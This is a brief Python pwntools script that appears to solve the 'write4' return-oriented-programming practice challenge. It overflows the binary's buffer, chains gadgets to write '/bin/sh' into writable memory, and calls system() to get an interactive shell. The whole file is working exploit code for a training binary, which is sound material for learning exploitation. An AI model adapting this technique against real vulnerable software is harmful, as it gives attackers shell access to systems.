from pwn import *

p = process('./write4')

pop_14_15 = 0x0000000000400890
mov_r14_r15 = 0x0000000000400820
pop_rdi = 0x0000000000400893
system_addr = 0x00000000004005E0
data_addr = 0x0000000000601050
pad = 'A'*40

payload = pad
payload += p64(pop_14_15)
payload += p64(data_addr)
payload += '/bin/sh\x00'
payload += p64(mov_r14_r15)
payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
